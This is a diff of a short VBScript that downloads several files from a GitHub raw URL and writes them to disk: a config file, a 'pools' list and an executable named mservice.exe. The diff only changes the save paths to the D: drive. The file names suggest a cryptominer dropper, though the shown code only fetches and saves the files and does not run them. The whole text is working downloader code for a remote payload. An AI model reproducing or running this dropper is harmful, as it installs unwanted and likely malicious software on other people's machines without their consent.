@@ -6,7 +6,7 @@ sGet.Mode = 3
 sGet.Type = 1   
 sGet.Open()   
 sGet.Write(xPost.responseBody)   
-sGet.SaveToFile "cpu.txt",2 '
+sGet.SaveToFile "d:/cpu.txt",2 '
 
 Set xPost = createObject("Microsoft.XMLHTTP")   
 xPost.Open "GET","https://raw.githubusercontent.com/mbaiyy/wine/master/config.txt",0 '  
@@ -16,7 +16,9 @@ sGet.Mode = 3
 sGet.Type = 1   
 sGet.Open()   
 sGet.Write(xPost.responseBody)   
-sGet.SaveToFile "config.txt",2 '
+sGet.SaveToFile "d:/config.txt",2 '
+
+
 Set xPost = createObject("Microsoft.XMLHTTP")   
 xPost.Open "GET","https://raw.githubusercontent.com/mbaiyy/wine/master/pools.txt",0 '  
 xPost.Send()   
@@ -26,6 +28,8 @@ sGet.Type = 1
 sGet.Open()   
 sGet.Write(xPost.responseBody)   
 sGet.SaveToFile "pools.txt",2 '
+
+
 Set xPost = createObject("Microsoft.XMLHTTP")   
 xPost.Open "GET","https://raw.githubusercontent.com/mbaiyy/wine/master/mservice.exe",0 '  
 xPost.Send()   
@@ -34,4 +38,4 @@ sGet.Mode = 3
 sGet.Type = 1   
 sGet.Open()   
 sGet.Write(xPost.responseBody)   
-sGet.SaveToFile "mservice.exe",2 '
+sGet.SaveToFile "d:/mservice.exe",2 '
